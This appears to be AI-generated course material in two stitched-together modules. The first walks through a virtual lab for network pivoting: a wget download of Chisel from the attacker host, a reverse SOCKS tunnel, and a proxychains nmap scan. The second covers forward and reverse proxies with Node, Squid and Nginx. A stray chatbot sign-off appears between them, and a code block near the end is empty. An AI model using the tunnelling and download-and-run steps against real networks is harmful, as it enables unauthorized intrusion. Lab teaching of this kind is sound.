# Module 01 — Core Foundations: Pivoting Lab Setup

## Objective
Build a **strong practical foundation** in networking, operating systems, and offensive methodology. By the end of this module, students will be able to:

- Understand and manipulate **TCP/IP and OSI layers**.
- Perform **subnetting and VLAN analysis**.
- Enumerate and exploit **operating system weaknesses**.
- Conduct **post-exploitation** and **pivoting** using tunneling tools like **Chisel**.
- Follow a structured **penetration testing methodology** mapped to **MITRE ATT&CK** and the **Cyber Kill Chain**.

***

## Lab Overview: Network Pivoting with Chisel
You’ll build a **multi-network lab environment** using **VirtualBox** to simulate network isolation and penetration testing scenarios.

### Machines Setup
| Role | OS | Purpose |
|------|----|----------|
| Attacker | Kali Linux | Primary attack and control machine |
| Pivot | Ubuntu Linux | Dual-homed host bridging two NAT networks |
| Internal Linux Host | Debian/Ubuntu | Target in internal subnet |
| Internal Windows Host | Windows 10 | Target in internal subnet |

***

## Step 1 — VirtualBox Network Configuration
1. **Create two NAT Networks**:
   - **NATNetwork1:** `10.0.10.0/24` — attacker and pivot connected here.
   - **NATNetwork2:** `10.0.20.0/24` — pivot, internal Linux, and Windows hosts connected here.

2. **Configure adapters:**
   - **Kali:** Single adapter → NATNetwork1.
   - **Pivot (Ubuntu):** Two adapters → NATNetwork1 and NATNetwork2 (dual NIC).
   - **Linux target:** Single adapter → NATNetwork2.
   - **Windows target:** Single adapter → NATNetwork2.

👉 Verify connectivity with `ping`:
- Kali ↔ Pivot ✅
- Pivot ↔ Internal hosts ✅
- Kali ↔ Internal hosts ❌ (blocked — will pivot later)

***

## Step 2 — Configure the Kali Attacker Machine

1. **Install tools:**
   ```bash
   sudo apt update && sudo apt install chisel proxychains4 -y
   ```

2. **Edit proxychains configuration:**
   ```bash
   sudo nano /etc/proxychains4.conf
   ```
   Add at the bottom:
   ```
socks5  127.0.0.1 1080
   ```

3. Start listening for reverse traffic:
   ```bash
   ./chisel server -p 8080 --reverse
   ```

   This will allow reverse connections from the pivot host.

***

## Step 3 — Upload and Run Chisel on Pivot Host (Ubuntu)

1. **Transfer Chisel:**
   Use a simple Python HTTP server on Kali:
   ```bash
   python3 -m http.server 8000
   ```
   Then on the pivot:
   ```bash
   wget http://<kali_ip>:8000/chisel
   chmod +x chisel
   ```

2. **Run Chisel Client (Reverse Connection):**
   ```bash
   ./chisel client <kali_ip>:8080 R:socks
   ```
   This creates a SOCKS proxy from pivot → attacker.

***

## Step 4 — Verify Proxy and Pivot Access

1. **Check connectivity** from Kali through proxychains:
   ```bash
   proxychains nmap -sT 10.0.20.0/24
   ```
   You should see open ports of the internal Linux and Windows machines.

2. Your traffic is now tunneled through the Pivot host using Chisel.

***

## Step 5 — Advanced: Double Pivot (Optional)

To demonstrate **deep network traversal**, you can add another internal machine on a third subnet and chain Chisel tunnels, as described in HTB’s double pivot guide. This allows multi-hop access similar to real enterprise environments.

***

## Step 6 — Post-Exploitation Workflow

Use this setup to practice:
- **Enumerating internal networks** with tools like `nmap` and `smbclient`.
- **Credential dumping** and **lateral movement** simulations.
- Applying **MITRE ATT&CK stages**, from Initial Access to Execution and Persistence.

***

## Step 7 — Reflection & Documentation

Document:
- Network map diagrams.
- Chisel commands used.
- Verification results (connectivity tests, successful scans).
- Lessons learned about traffic tunneling and segmentation.

***

### Summary
After completing this module, you’ll understand:
- How to configure and isolate virtual networks.
- The purpose and power of network pivoting.
- How tools like **Chisel** enable controlled tunneling and SOCKS proxy access.
- How pivoting integrates into the **post-exploitation** stage of a penetration test.

If you tell me whether this module is for your **personal lab** or **structured training curriculum**, I can tailor the terminology, exercises, and difficulty level accordingly.

## 1. Overview & Learning Objectives

By the end of this module you will be able to:

* Explain the difference between forward proxies and reverse proxies.
* Deploy and configure a basic forward proxy (Node.js and Squid).
* Configure an Nginx reverse proxy with multiple upstreams, load balancing, and TLS termination.
* Understand common headers (X-Forwarded-For, X-Real-IP, Via, Forwarded) and how proxies modify them.
* Evaluate caching implications and proxy security controls.
* Use Docker Compose to stand up repeatable labs.

## 2. Prerequisites

* Basic Linux command-line skills (ssh, curl, grep).
* Docker & Docker Compose installed (labs use containers).
* Basic understanding of HTTP and TLS.

## 3. Key Concepts & Terminology

* **Client:** The originator of requests (browser, curl).
* **Origin / Upstream:** The server that has the content or application.
* **Proxy:** An intermediary that forwards requests between client and server, and may inspect, filter, cache, or modify traffic.
* **Forward Proxy:** Client-configured proxy used to reach arbitrary external servers on behalf of clients.
* **Reverse Proxy:** Server-side proxy placed in front of one or more origin servers; clients think they talk to the origin but talk to the proxy.
* **Transparent Proxy:** Intercepts traffic without client configuration (commonly done using network routing/iptables).
* **TLS Termination:** Proxy handles TLS (HTTPS) and forwards plain HTTP to upstream.

## 4. Proxy Types

### Forward Proxy

* Acts on behalf of clients. Typical uses: access control, rate limiting, anonymization, caching, content filtering.
* Clients must be configured (browser proxy, environment variables) unless a transparent forward proxy is used.

### Reverse Proxy

* Acts on behalf of one or more servers. Typical uses: load balancing, TLS termination, caching, WAF integration, path-based routing.
* Common products: Nginx, HAProxy, Traefik, Apache httpd, F5.

### Transparent Proxy

* Intercepts traffic without client awareness. Often used in enterprise networks for content filtering or caching.
* Requires network-level manipulation (routing, NAT, firewall rules).

### Comparison (short table)

| Feature           |                        Forward Proxy |                   Reverse Proxy |
| ----------------- | -----------------------------------: | ------------------------------: |
| Configured by     |                               Client |            Server/Network admin |
| Primary use       | Client privacy / filtering / caching | Load balancing / TLS / security |
| Visible to client |                        Yes (usually) |       No (client thinks origin) |

## 5. Architecture Diagrams

### Forward Proxy (simple)

Client -> Forward Proxy -> Internet (Origin)

### Reverse Proxy (simple)

Client -> Reverse Proxy -> Upstream App A
-> Upstream App B

(Reverse proxy terminates TLS, does path-based routing, or load balancing.)

## 6. Hands-on Labs

> Each lab folder contains `README.md`, `Dockerfile` (if needed), and `test.sh` to run basic checks.

### Lab A — Minimal Node.js Forward Proxy

**Purpose:** Implement a very small HTTP forward proxy to learn request/response flow and headers.

**Files:** `labs/forward-proxy/node-proxy/index.js`

```js
// index.js — simple forward proxy (educational only, not production)
const http = require('http');
const net = require('net');
const url = require('url');

const server = http.createServer((req, res) => {
  const target = url.parse(req.url);
  const options = {
    hostname: target.hostname,
    port: target.port || 80,
    path: target.path,
    method: req.method,
    headers: req.headers
  };

  const proxyReq = http.request(options, proxyRes => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res, { end: true });
  });

  req.pipe(proxyReq, { end: true });
});

server.on('connect', (req, clientSocket, head) => {
  // handle HTTPS CONNECT tunnels
  const { port, hostname } = new URL(`http://${req.url}`);
  const serverSocket = net.connect(port || 443, hostname, () => {
    clientSocket.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    serverSocket.write(head);
    serverSocket.pipe(clientSocket);
    clientSocket.pipe(serverSocket);
  });
});

server.listen(3128, () => console.log('Forward proxy listening on 3128'));
```

**How to test:**

* Start: `node index.js`
* Use curl: `curl -x http://localhost:3128 http://example.com` (HTTP)
* For HTTPS: `curl -x http://localhost:3128 https://example.com` (CONNECT tunneling)

**Learning notes:**

* This proxy forwards headers as-is; clients' `Host`, `User-Agent` etc. will be seen by upstream.
* Production proxies need ACLs, auth, rate-limits, TLS interception (if required), and logging.

### Lab B — Squid Forward Proxy (Docker)

**Purpose:** Use Squid for a realistic forward proxy with ACLs and caching.

**Files:** `labs/forward-proxy/squid/` contains `Dockerfile`, `squid.conf`, `docker-compose.yml` and `README.md`.

**Key `squid.conf` points:**

* `http_port 3128` — listen port
* Access control lists for allowed networks
* cache_dir settings

**Quick start:** `docker-compose up -d` then configure browser/system to use `localhost:3128` as HTTP/HTTPS proxy.

### Lab C — Nginx Reverse Proxy + App (Docker Compose)

**Purpose:** Deploy an Nginx reverse proxy that routes `/app1` to App1 and `/app2` to App2, with load balancing.

**Files:** `labs/reverse-proxy/nginx/` and `labs/reverse-proxy/apps/` — includes sample Node apps.

**Sample `nginx.conf` snippet:**

```nginx
http {
  upstream app_pool {
    server app1:3000;
    server app2:3000;
  }

  server {
    listen 80;
    server_name proxy.local;

    location / {
      proxy_pass http://app_pool;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    location /app1/ {
      proxy_pass http://app1:3000/;
    }
  }
}
```

**Docker Compose:** provides `nginx`, `app1`, `app2`. Add `extra_hosts` mapping `proxy.local` to `127.0.0.1` for local testing.

**Test:** `curl http://localhost:8080/` -> proxy should distribute to upstreams.

### Lab D — TLS termination & Let's Encrypt (Reverse Proxy)

**Purpose:** Configure TLS termination at the reverse proxy using Certbot or an automated proxy (Traefik) for certificate management.

**Notes:**

* For local development, use self-signed certs and add to OS trust.
* For public-facing endpoints, use Let's Encrypt with either Certbot or a proxy that supports ACME (Traefik, Caddy).

### Lab E — Caching behavior & headers testing

**Tasks:**

* Configure `proxy_cache_path` and `proxy_cache` in Nginx.
* Request resource repeatedly while varying `Cache-Control` headers and observe hits/misses with `X-Cache-Status` header.

## 7. Example Configurations

### Nginx — Reverse Proxy basic

```nginx
server {
  listen 80;
  server_name example.com;

  location / {
    proxy_pass http://backend:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```

### Squid — Minimal `squid.conf` (example)

```
http_port 3128
acl localnet src 10.0.0.0/8    # adjust
http_access allow localnet
http_access deny all
cache_dir ufs /var/spool/squid 100 16 256
access_log /var/log/squid/access.log
```

### Docker Compose (Reverse Proxy + 2 apps)

```yaml
version: '3.8'
services:
  nginx:
    image: nginx:stable
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
    ports:
      - '8080:80'
    depends_on:
      - app1
      - app2

  app1:
    build: ./apps/app1
    ports:
      - '3001:3000'

  app2:
    build: ./apps/app2
    ports:
      - '3002:3000'
```

## 8. Testing & Validation

**Useful curl commands**

* Test forward proxy (HTTP):
  `curl -v -x http://localhost:3128 http://example.com/`

* Test reverse proxy (path routing):
  `curl -v http://localhost:8080/app1/`

* Check X-Forwarded-For:
  `curl -H 'X-Forwarded-For: 1.2.3.4' http://localhost:8080/` (observe logs)

* HTTPS (CONNECT via curl):
  `curl -v --proxy http://localhost:3128 https://example.com/`

## 9. Security Considerations

* **Authentication:** Implement proxy auth for forward proxies (Basic, Digest, or OAuth-based). Squid supports auth helpers.
* **ACLs:** Limit which clients can use the forward proxy to avoid open proxy abuse.
* **Header hygiene:** Don’t blindly trust `X-Forwarded-For`; validate/log real client IP when possible (use mutual TLS or secure network paths).
* **TLS:** Terminate TLS at reverse proxy when necessary but consider end-to-end TLS if confidentiality must be preserved.
* **Rate limiting & WAF:** Use proxy features or front with WAF to mitigate abusive traffic.
* **Logging & privacy:** Ensure logs are stored securely and PII is masked if policy requires.

## 10. Troubleshooting Checklist

* Is the proxy listening on the expected port? `ss -tuln | grep 3128`
* Are firewall rules blocking traffic? Check `iptables` / `ufw`.
* For reverse proxy: is `proxy_pass` URL reachable from the proxy container? `docker exec -it nginx curl http://app1:3000/`
* Check headers — `Host`, `X-Forwarded-For`, `X-Real-IP` — are they set correctly?
* If HTTPS failing: inspect cert chain with `openssl s_client -connect host:443 -servername host`.

## 11. Assessment: Exercises & Quiz

**Practical tasks**

1. Deploy the Docker Compose reverse proxy lab and demonstrate path-based routing to two apps.
2. Run the Node.js forward proxy and fetch a site via the proxy (show headers).
3. Configure Squid to allow only a specific client IP and to log cache hits. Show evidence.

**Quiz (short)**

* Q1: What header typically carries client IPs through a reverse proxy? (Answer: `X-Forwarded-For`)
* Q2: What is an open forward proxy and why is it dangerous? (Answer: a proxy that accepts requests from any client on the Internet — can be abused for anonymized attacks)
* Q3: Does a reverse proxy require client configuration? (Answer: No)

## 12. Git Repository Structure

Suggested structure to commit to Git (recommended `module-2-proxies` repo):

```

**Commit guidance:** Make each lab a separate commit with descriptive history (e.g., `labs: add nginx reverse-proxy compose + sample apps`). Use branches for features: `feature/nginx-tls`, `feature/squid-auth`.

## 13. How to submit / mark as complete

* Add a `COMPLETED.md` in the lab folder with commands you ran, outputs, and screenshots where relevant.
* Create PR to `main` with lab solutions; include `test.sh` to automatically validate basic behavior.
